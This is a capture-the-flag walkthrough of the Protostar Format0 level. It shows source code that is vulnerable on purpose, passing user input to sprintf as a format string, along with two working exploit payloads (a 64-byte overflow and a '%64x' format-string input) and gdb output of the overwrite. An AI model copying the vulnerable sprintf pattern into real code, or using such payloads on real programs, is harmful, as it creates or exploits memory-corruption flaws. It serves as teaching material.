# For Format0 in Protostar

We are given the following source code:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
>This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

There are 2 ways to do solve this challenge.


### Method 1: Buffer overflow
This method violates the condition that "this level should be done in less than 10 bytes of input". However, it *is* a stepping stone to the correct solution.

This is the string literal of our exploit: `\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xef\xbe\xad\xde`.
The 64 `\x61` characters fill the buffer, and `\xef\xbe\xad\xde` overwrite the `target` variable.

Before `sprintf` is called, variable `target` is `0x0`, as expected.
```
(gdb) x/x $ebp - 0xc
0xbffff63c:	0x00000000
```

After `sprintf` is called, let's check the memory. We can see that variable `target` has been overwritten to `0xdeadbeef`.
```
(gdb) ni
0x08048416	15	in format0/format0.c
0x08048416 <vuln+34>:	 3d ef be ad de	cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:	 75 0c	jne    0x8048429 <vuln+53>
(gdb) x/x $ebp - 0xc
0xbffff63c:	0xdeadbeef
(gdb) c
Continuing.
you have hit the target correctly :)

Program exited with code 045.
(gdb) 
```

### Method 2: Format string

Our exploit in method 1 took 68 bytes. We want to be able to print these 68 bytes, but with less than 10 bytes. It sounds impossible, but it is actually very simple.

>       An optional decimal digit string (with nonzero first digit) specifying a minimum field width. If the converted value has fewer characters than the field width, it will be padded with spaces on the left (or right, if the left-adjustment flag has been given). Instead of a decimal digit string one may write "*" or "*m$" (for some decimal integer m) to specify that the field width is given in the next argument, or in the m-th argument, respectively, which must be of type int. A negative field width is taken as a '-' flag followed by a positive field width. In no case does a nonexistent or small field width cause truncation of a field; if the result of a conversion is wider than the field width, the field is expanded to contain the conversion result.
[source](https://linux.die.net/man/3/printf)

This is our new exploit input : `\x25\x36\x34\x78\xef\xbe\xad\xde`. Let me explain what it does.
There are two parts to it.

1. `\x25\x36\x34\x78` is hex for the ascii `%64x`. It states that the minimum field width of the formatted string should be 64 characters. Since `%x` prints only 8 characters, `%64x` includes 56 space characters (which are `0x20` in hex) as padding.

```
0xbffff63c:	0x20202020	0x20202020	0x20202020	0x20202020
0xbffff64c:	0x20202020	0x20202020	0x20202020	0x20202020
0xbffff65c:	0x20202020	0x20202020	0x34303820	0x38653138
```

"What is `0x34303820	0x38653138`," You might ask. Well, it is hex for the ascii " 80481e8" to represent the hex `0x80481e8`. And where might that come from? It comes from the stack. `0xbffff62c` is the address where the formatted string is printed to, `0xbffff8aa` is the address of the format string, and since a format flag (e.g. `%x`) was included, the next value in the stack is printed out as readable ascii representation of its hex.
```
(gdb) x/3xw $esp
0xbffff610:	0xbffff62c	0xbffff8aa	0x080481e8
```


2. Since part 1 of the input has filled our buffer, `\xef\xbe\xad\xde` merely overwrites the variable `target` with `0xdeadbeef`
```
0xbffff65c:	0x20202020	0x20202020	0x34303820	0x38653138
0xbffff66c:	0xdeadbeef
```
(I know the address of `target` here is different from in Method 1. I don't know why, but it happens. Most importantly though, the concept does not change.)


We win. “ヽ(´▽｀)ノ”
```
user@protostar:/opt/protostar/bin$ cat /home/user/format0\ input | xargs ./format0
you have hit the target correctly :)
```

END
